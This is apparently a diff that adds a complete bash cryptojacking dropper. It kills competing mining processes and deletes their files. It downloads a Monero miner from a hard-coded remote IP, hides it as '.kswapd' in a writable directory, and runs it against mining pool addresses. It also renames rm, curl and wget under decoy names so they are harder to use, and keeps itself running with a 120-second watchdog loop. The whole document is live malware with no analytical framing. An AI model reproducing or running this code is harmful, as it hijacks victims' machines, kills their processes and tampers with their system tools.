@@ -1,0 +1,74 @@
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+ARCH=$(uname -a)
+RHOST="http://138.197.206.223/.x/"
+RBIN1="xmra64"
+RBIN2="xmra32"
+LBIN1=".kswapd"
+UD=0
+
+b() {
+	mkdir -p ${LPATH} >/dev/null 2>&1; chattr -i ${LPATH} >/dev/null 2>&1; chmod 1755 ${LPATH} >/dev/null 2>&1
+	
+	hload=$(ps aux|grep -v 'l0'|grep -v 'eth1'|grep -v 'lan0'|grep -v '^-'| grep -v 'eth0'|grep -v 'inet0'|grep -v 'lano'|grep -v grep|grep -v defunct|grep -v "knthread"|grep -vi 'aaaaaaaaaa'|grep -vi 'java '|grep -vi 'jenkins'|grep -vi 'exim'|awk '{if($3>=54.0) print $11}'|head -n 1)
+	[ "${hload}" != "" ] && { ps ax|grep -v grep|grep -v defunct|grep -v knthread|grep -F "${hload}"|while read pid _; do if [ ${pid} -gt 301 ] && [ "$pid" != "$$" ]; then "echo killing: ${pid}"; kill -9 "${pid}" >/dev/null 2>&1; fi; done; }
+	
+	hload2=$(ps aux|grep -v 'l0'|grep -v 'eth1'|grep -v 'lan0'| grep -v '^-' | grep -v 'eth0'|grep -v 'inet0'|grep -v 'lano'|grep -v grep|grep -v defunct|grep -v python|grep -v knthread|grep -vi 'aaaaaaaaaa'|grep -vi "bash"|grep -vi 'exim'|awk '{if($3>=0.0) print $2}'|uniq)
+	if [[ ! "${hload2}" == "" ]]; then
+        for p in ${hload2}; do
+            xm=''
+            if [[ $p -gt 301 ]] && [[ ! "$pid" == "$$" ]] && [[ ! "$pid" == "$PPID" ]]; then
+                if [ -f /proc/${p}/exe ]; then
+                    xmf="$(readlink /proc/${p}/exe 2>/dev/null)"
+                    xm=$(grep -i "xmr\|cryptonight\|hashrate" /proc/${p}/exe 2>&1)
+                elif [ -f /proc/${p}/comm ]; then
+                    xmf="$(readlink /proc/${p}/cwd)/$(cat /proc/${p}/comm)"
+                    xm=$(grep -i "xmr\|cryptonight\|hashrate" ${xmf} 2>&1)
+                fi
+                if [[ "${xm}" == *"matches"* ]]; then 
+					echo "killing ${p} and removing: ${xmf}"
+					kill -9 ${p} >/dev/null 2>&1
+					${rm} -rf ${xmf} >/dev/null 2>&1
+				fi
+            fi
+        done
+    fi
+
+	#(netstat -an | grep 8081 >/dev/null) || kill -9 `ps -x | grep knthread | grep -v grep | awk {'print $1'}`
+
+	if [ ! -f ${LPATH}${LBIN1} ] || ([ $(md5sum ${LPATH}${LBIN1} | cut -c 1-32) != "1fe52c0b0139660b2335dd7b7c12ea05" ] && [ $(md5sum ${LPATH}${LBIN1} | cut -c 1-32) != "2592a8c8c2c9f5f3490f3e03cc8870f2" ]); then
+        if [ ! $(echo "${ARCH}"|grep 'x86_64'|wc -l) -eq 0 ]; then
+			(${curl} ${RHOST}${RBIN1} -o ${LPATH}${LBIN1}||${wget} ${RHOST}${RBIN1} -O ${LPATH}${LBIN1})
+        else
+            (${curl} ${RHOST}${RBIN2} -o ${LPATH}${LBIN1}||${wget} ${RHOST}${RBIN2} -O ${LPATH}${LBIN1})
+        fi
+    fi
+	chmod +x ${LPATH}${LBIN1}
+	${LPATH}${LBIN1} -o 185.165.171.78:8081 -o 185.86.148.14:8081 -B >/dev/null 2>&1 &
+}
+
+if [ $(rm --help 2>/dev/null|grep " rm does not remove dir"|wc -l) -ne 0 ]; then rm="rm"; elif [ $(rrn --help 2>/dev/null|grep " rm does not remove dir"|wc -l) -ne 0 ]; then rm="rrn"; else rm="echo"; for f in /bin/*; do strings $f 2>/dev/null|grep -qi " rm does not remove dir" && rm="$f" && mv -f $rm /bin/rrn && break; done; fi
+if [ $(curl --help 2>/dev/null|grep -i "Dump libcurl equivalent"|wc -l) -ne 0 ]; then curl="curl"; elif [ $(lxc --help 2>/dev/null|grep -i "Dump libcurl equivalent"|wc -l) -ne 0 ]; then curl="lxc"; else curl="echo"; for f in ${bpath}/*; do strings $f 2>/dev/null|grep -qi "Dump libcurl equivalent" && curl="$f" && mv -f $curl ${bpath}/lxc && break; done; fi
+if [ $(wget --version 2>/dev/null|grep -i "wgetrc "|wc -l) -ne 0 ]; then wget="wget"; elif [ $(lxw --version 2>/dev/null|grep -i "wgetrc "|wc -l) -ne 0 ]; then wget="lxw"; else wget="echo"; for f in ${bpath}/*; do strings $f 2>/dev/null|grep -qi ".wgetrc'-style command" && wget="$f" && mv -f $wget ${bpath}/lxw && break; done; fi
+
+rand=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(shuf -i 4-16 -n 1) ; echo ''); if [ -z ${rand} ]; then rand='.tmp'; fi
+echo "${rand}" > "$(pwd)/.${rand}" 2>/dev/null && LPATH="$(pwd)/.cache/"; ${rm} -f "$(pwd)/.${rand}" >/dev/null 2>&1
+echo "${rand}" > "/tmp/.${rand}" 2>/dev/null && LPATH="/tmp/.cache/"; ${rm} -f "/tmp/.${rand}" >/dev/null 2>&1
+echo "${rand}" > "/usr/local/bin/.${rand}" 2>/dev/null && LPATH="/usr/local/bin/.cache/"; ${rm} -f "/usr/local/bin/.${rand}" >/dev/null 2>&1
+echo "${rand}" > "/dev/shm/.${rand}" 2>/dev/null && LPATH="/dev/shm/.cache/"; ${rm} -f "/dev/shm/.${rand}" >/dev/null 2>&1
+echo "${rand}" > "${HOME}/.${rand}" 2>/dev/null && LPATH="${HOME}/.cache/"; ${rm} -f "${HOME}/.${rand}" >/dev/null 2>&1
+
+wdog0=$(ps aux|grep -v 'grep'|grep -v defunct|grep -v 'sh '|grep ' sleep 120'|wc -l)
+if [ ${UD:-0} -gt 0 ] && [ ${wdog0} -gt 0 ]; then
+	ps -eo ppid,cmd|grep -v grep|grep -v defunct|grep -v 'sh '|grep -i 'sleep 120'|awk '{print $1}'|while read pid _; do [ ${pid} -gt 301 ] && (kill -9 "$pid" >/dev/null 2>&1;); done
+	ps aux|grep -v 'grep'|grep -v defunct|grep -v 'sh '|grep 'kntread\|bash\|wget\|curl\|timeout\|sleep'|awk '{print $2}'|while read pid _; do [ ${pid} -gt 301 ] && (kill -9 "$pid" >/dev/null 2>&1;); done
+	sleep 5
+fi
+
+if [[ $(ps aux|grep -v 'grep'|grep -v 'sh '|grep -v defunct|grep ' sleep 120'|wc -l) -lt 2 ]]; then
+    while true; do
+        b >/dev/null 2>&1 &
+        sleep 120
+    done &
+fi
